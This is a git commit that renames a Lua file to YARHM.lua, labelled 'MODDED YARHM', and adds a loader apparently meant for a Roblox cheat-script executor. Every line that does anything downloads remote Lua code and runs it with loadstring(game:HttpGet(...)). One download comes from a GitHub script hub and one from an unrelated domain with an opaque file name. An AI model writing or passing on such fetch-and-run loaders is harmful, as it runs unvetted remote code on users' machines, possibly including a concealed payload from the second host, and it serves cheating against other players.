552cae16500ccca5f6f776fcd1be602087cd75f6
Schizo's Reposts <ashurakun.woo@gmail.com>
2024-08-04 08:54:58 +0800

    Update and rename script.lua to YARHM.lua
    MODDED YARHM

---
+++ YARHM.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/e199ad06d03126c05d5ba1fd.lua", true))()
